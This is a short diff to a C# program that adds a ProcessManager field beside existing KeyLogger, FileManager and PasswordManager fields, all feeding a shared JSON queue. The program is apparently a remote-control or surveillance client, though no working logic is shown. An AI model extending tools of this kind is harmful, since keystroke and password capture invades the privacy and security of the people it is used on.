@@ -27,6 +27,7 @@ class Program
     static KeyLogger keyLogger = new KeyLogger(EnqueueJson);
     static FileManager fileManager = new FileManager(EnqueueJson);
     static PasswordManager passwordManager = new PasswordManager(EnqueueJson);
+    static ProcessManager processManager = new ProcessManager(EnqueueJson);
     #endregion
 
     public delegate void MessageReceivedHandler(dynamic message);
